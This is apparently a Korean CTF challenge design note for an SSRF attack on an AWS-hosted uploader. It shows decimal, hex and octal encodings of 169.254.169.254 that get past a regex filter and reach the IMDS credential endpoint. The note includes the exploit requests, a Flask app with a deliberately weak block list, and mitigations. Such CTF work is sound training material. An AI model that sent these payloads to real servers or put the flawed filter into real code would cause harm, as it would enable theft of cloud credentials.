---
title: AWS Metadata SSRF & IP Representation Filter Bypass — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, ssrf, aws-metadata, imds, ip-bypass, filter-evasion]
confidence: high
---

# AWS Metadata SSRF & IP Representation Filter Bypass — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: AWS Cloud Uploader (클라우드 업로더 서비스)
- **난이도**: Medium-High
- **핵심 컨셉**: 클라우드 인프라 환경(AWS)에서 동작하는 서버의 메타데이터 서비스(IMDS)를 타겟으로 하는 **SSRF 필터 우회** 문제입니다. 백엔드 서버는 외부 이미지 URL을 입력받아 업로드 처리하며, 보안을 위해 `169.254.169.254` 문자열 및 사설 IP 대역이 입력에 포함되는지 정규표현식으로 검사합니다. 공격자는 정규식 검사를 우회하기 위해 IP 주소를 **10진수(Decimal), 16진수(Hex), 8진수(Octal) 등**의 형식으로 인코딩해 전달하거나, 302 리디렉션을 지원하는 외부 서버를 경유해 필터 검증을 무력화하고 AWS 임시 자격증명 토큰을 유출시킵니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend**: 업로드할 외부 리소스 이미지 URL 입력 페이지.
- **Backend Service (Python/Flask or Node.js)**:
  - 이미지 다운로드를 위한 HTTP 클라이언트 모듈 가동.
  - 입력 문자열 필터링: `169.254.169.254` 또는 `localhost`, `127.0.0.1` 문자열 포함 시 에러 반환.
- **가상 AWS 환경 (IMDSv1)**:
  - 내부 로컬망 `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role` 주소에 접근 시 클라우드 관리 권한 토큰 노출.
- **Flag 위치**:
  - AWS 메타데이터 엔드포인트에 성공적으로 닿았을 때 반환되는 JSON 데이터 내부의 `AccessKeyId` 및 `Token` 필드(가상 플래그 문자열).

### 2.2 취약점 지점
1. **Weak IP Regex filtering**:
   - 보안 검사가 호스트명의 도메인 문자열 매치나 단순한 평문 4바이트 IP 형태만 검사합니다.
   - 운영체제 내부 소켓 라이브러리(`socket.gethostbyname` 또는 커널)는 10진수 정수형태 등으로 표시된 IP도 최종 해석하여 통신을 연결하므로 불일치(Bypass)가 발생합니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 / 파라미터 | 메소드 | 인증 | 입력 값 | 반환 값 | 비고 |
|---------------------|--------|------|---------|---------|------|
| `/api/upload?url=...`| GET | 없음 | `url` 파라미터 | 다운로드된 리소스 본문 또는 성공 알림 | SSRF 필터 우회 및 메타데이터 질의 타켓 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 단순 IP 차단 확인
공격자는 직접적으로 AWS 메타데이터 서버에 접근을 시도해 보안 정책을 살핍니다.
- `/api/upload?url=http://169.254.169.254/latest/meta-data/`  
  -> *응답*: "Blocked: Malicious URL detected!" (평문 IP 차단 확인)

### Step 2. IP 표현 방식 우회 공격 설계
운영체제가 지원하는 대체 IP 표기법으로 `169.254.169.254` 주소를 변환합니다.
- **10진수(Decimal) IP 계산**:
  \((169 \times 256^3) + (254 \times 256^2) + (169 \times 256^1) + 254 = 2852039166\)
  - 변환 주소: `http://2852039166/`
- **16진수(Hex) IP 변환**:
  - `169` -> `0xa9`, `254` -> `0xfe`, `169` -> `0xa9`, `254` -> `0xfe`
  - 변환 주소: `http://0xa9fea9fe/`
- **8진수(Octal) IP 변환**:
  - `169` -> `0251`, `254` -> `0376`
  - 변환 주소: `http://0251.0376.0251.0376/`

### Step 3. 최종 익스플로잇 및 메타데이터 조회
공격자는 인코딩된 주소를 사용하여 AWS IAM 역할명 경로까지 상세 질의를 전송합니다.
- *공격 요청*:
  ```http
  GET /api/upload?url=http://2852039166/latest/meta-data/iam/security-credentials/admin-role HTTP/1.1
  Host: cloud-uploader.challenge.local
  ```

### Step 4. flag 획득
서버는 `2852039166` 문자열이 `169.254` 필터와 매칭되지 않으므로 검증을 통과시키고 cURL/urllib 라이브러리로 해당 주소를 연결합니다. 커널에 의해 `169.254.169.254`로 정상 파싱되어 AWS 내부 응답을 복사해 반환하고, 공격자는 응답 본문 내의 플래그 토큰(`FLAG{ssrf_imds_ip_notation_bypass}`)을 획득합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Python Flask)

```python
# app.py
from flask import Flask, request, jsonify
import urllib.request
import re

app = Flask(__name__)

# 취약한 정규 표현식 필터: 169.254.169.254 문자열 자체나 127.0.0.1 만 차단
BLOCK_LIST = [
    r"169\.254\.169\.254",
    r"127\.0\.0\.1",
    r"localhost"
]

def is_safe_url(url):
    for pattern in BLOCK_LIST:
        if re.search(pattern, url):
            return False
    return True

@app.route("/api/upload")
def upload_resource():
    target_url = request.args.get("url")
    if not target_url:
        return "Missing url", 400
        
    if not is_safe_url(target_url):
        return "Blocked: Malicious URL detected!", 403
        
    try:
        # 취약점 지점: urllib.request는 10진수형 IP(2852039166)도 정상적으로 
        # DNS 해석기 없이 소켓 연결을 수행해 169.254.169.254로 연결시킵니다.
        req = urllib.request.Request(target_url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=3) as response:
            content = response.read().decode('utf-8')
            return jsonify({"status": "success", "content": content})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **최종 해석 IP에 대한 검증 (Resolve & Validate)**:
   - 입력 문자열을 검사하지 말고, 라이브러리를 통해 호스트명을 최종 IP 주소로 해석(Resolve)한 뒤 해당 주소의 각 4개 옥텟을 숫자 형식으로 정규화하여 사설/루프백 범주에 해당하는지 검사합니다.
   - **올바른 수정 예시**:
     ```python
     import socket
     from ipaddress import ip_address
     
     # 도메인/주소를 실제 IP 객체로 정규화 변환
     resolved_ip = socket.gethostbyname(parsed_domain)
     ip_obj = ip_address(resolved_ip)
     
     # 사설망 또는 링크 로컬(169.254.x.x) 여부를 학문적으로 완벽히 파악
     if ip_obj.is_private or ip_obj.is_link_local or ip_obj.is_loopback:
         return False # 차단
     ```
2. **AWS IMDSv2 활성화 정책 수립**:
   - 클라우드 인프라 설정에서 IMDSv1을 비활성화하고, 반드시 헤더 토큰 인증이 결부되는 IMDSv2 규격을 강제화하여 SSRF 요청만으로 기밀 토큰 정보가 바로 새어나가지 않도록 제어합니다.
